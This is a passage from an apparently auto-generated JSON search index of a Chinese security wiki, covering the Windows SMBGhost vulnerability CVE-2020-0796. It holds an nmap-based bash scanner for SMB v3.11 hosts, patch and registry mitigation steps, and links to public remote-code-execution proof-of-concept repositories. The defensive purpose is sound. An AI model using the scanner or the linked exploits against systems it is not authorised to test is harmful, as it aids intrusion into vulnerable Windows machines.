\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_6","text":"\u5947 \u5b89 \u4fe1 \u6279 \u91cf \u68c0 \u6d4b \u5de5 \u5177 \uff1a http://dl.qianxin.com/skylar6/CVE \u00ad2020\u00ad0796\u00adScanner.zip sh \u811a \u672c \u68c0 \u6d4b \uff1a https://gist.githubusercontent.com/nikallass/40f3215e6294e94cde78ca60dbe07394/raw/84d803de9\\ 37f5b6810df4441cc84f0fa63991e2e/check\u00adsmb\u00adv3.11.sh #!/bin/bash if [ $# -eq 0 ] then echo $ Usage:\\n\\tcheck-smb-v3.11.sh TARGET_IP_or_CIDR exit 1 fi echo Checking if there s SMB v3.11 in $1 ... nmap -p445 --script smb-protocols -Pn -n $1 | grep -P \\d+\\.\\d+\\.\\d+\\.\\d+|^\\|.\\s+3.11 | tr \\n | replace Nmap scan report for @ | tr @ \\n | grep 3 .11 | tr | | tr _ | grep -oP \\d+\\.\\d+\\.\\d+\\.\\d+ if [[ $? ! = 0 ]] ; then echo There s no SMB v3.11 fi","title":"\u516d\u3001\u6f0f\u6d1e\u68c0\u6d4b"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_7","text":"\u66f4\u65b0\uff0c\u5b8c\u6210\u8865\u4e01\u7684\u5b89\u88c5\u3002 \u64cd\u4f5c\u6b65\u9aa4\uff1a\u8bbe\u7f6e\u00ad>\u66f4\u65b0\u548c\u5b89\u5168\u00ad>Windows\u66f4\u65b0\uff0c\u70b9\u51fb\"\u68c0\u67e5\u66f4\u65b0\"\u3002 \u5fae\u8f6f\u7ed9\u51fa\u4e86\u4e34\u65f6\u7684\u5e94\u5bf9\u529e\u6cd5\uff1a \u8fd0\u884cregedit.exe\uff0c\u6253\u5f00\u6ce8\u518c\u8868\u7f16\u8f91\u5668\uff0c\u5728HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\u5efa\u7acb\u4e00\u4e2a\u540d\u4e3aDisableCompression\u7684DWORD\uff0c\u503c\u4e3a1\uff0c\u7981\u6b62SMB\u7684\u538b\u7f29\u529f\u80fd\u3002 \u5bf9SMB\u901a\u4fe1445\u7aef\u53e3\u8fdb\u884c\u5c01\u7981\u3002 \u8865\u4e01\u94fe\u63a5 https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762","title":"\u4e03\u3001\u6f0f\u6d1e\u4fee\u590d"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_8","text":"https://www.cnblogs.com/A66666/p/29635a243378b49ccb485c7a280df989.html > https://github.com/danigargu/CVE \u00ad2020\u00ad0796 http://dl.qianxin.com/skylar6 https://github.com/ollypwn/SMBGhost https://github.com/chompie1337/SMBGhost _RCE_PoC https://github.com/danigargu/CVE \u00ad2020\u00ad0796 https://blog.zecops.com/vulnerabilities/exploiting \u00adsmbghost\u00adcve\u00ad2020\u00ad0796\u00adfor\u00ada\u00adlocal\u00adprivilege\u00adescalation\u00adwriteup\u00adand\u00adpoc/","title":"\u516b\u3001\u53c2\u8003\u8fde\u63a5"}]}